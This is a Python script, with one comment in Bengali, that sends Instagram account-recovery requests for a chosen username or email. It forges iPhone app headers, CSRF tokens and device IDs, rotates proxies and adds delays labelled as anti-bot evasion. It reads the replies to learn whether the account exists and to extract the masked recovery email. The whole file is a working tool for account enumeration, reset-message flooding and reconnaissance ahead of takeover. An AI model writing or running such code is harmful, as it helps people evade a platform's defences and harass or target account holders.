import random, re, httpx, uuid, time

IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.4", "17.5"]
DEVICES = [
    ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
    ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
]
LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9"]

# 🚨 এখানে আপনি প্রয়োজনে প্রোক্সি বসাতে পারেন
PROXIES = [
    None, 
    # "http://12.34.56.78:8080", 
]

def _gen_device_id():
    return ''.join(random.choices('0123456789abcdef', k=16))

def gen_headers():
    ios_ver = random.choice(IOS_VERSIONS)
    device_id, device_name = random.choice(DEVICES)
    locale = random.choice(LOCALES)
    guid = str(uuid.uuid4())
    
    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios_ver}; {locale}; {device_name}; {device_id})"
    
    headers = {
        "User-Agent": ua,
        "x-ig-app-id": "936619743392459", 
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": guid,
        "x-device-id": _gen_device_id(),
        "accept-language": locale,
        "content-type": "application/x-www-form-urlencoded",
        "Cookie": f"csrftoken={guid}; ig_did={str(uuid.uuid4()).upper()};"
    }
    return headers

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    time.sleep(random.uniform(1.0, 2.5)) # Anti-bot delay
    
    proxy = random.choice(PROXIES)
    proxy_mounts = {"http://": proxy, "https://": proxy} if proxy else None

    try:
        with httpx.Client(http2=True, headers=gen_headers(), proxies=proxy_mounts, timeout=30.0) as client:
            data = {
                "email_or_username": target,
                "flow": "fxcal",
                "recaptcha_challenge_field": "",
                "recaptcha_response_field": "manual_challenge",
                "rollout_hash": "1" + str(random.randint(10000000, 99999999)),
                "__a": "1",
                "__d": "dis"
            }
            
            r = client.post(URL, data=data)
            t = r.text.lower()

            if r.status_code == 429 or "rate limit" in t:
                return "error:rate_limited"
                
            em = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', t)
            if em: 
                return f"email:{em.group(0)}"
                
            if "no user found" in t or "couldn't find" in t:
                return "error:not_found"
            if "checkpoint" in t or "suspicious" in t:
                return "error:blocked"
                
            return "phone"
            
    except httpx.ProxyError:
        return "error:proxy_dead"
    except httpx.TimeoutException:
        return "error:timeout"
    except Exception as e:
        return f"error:{str(e)[:20]}"
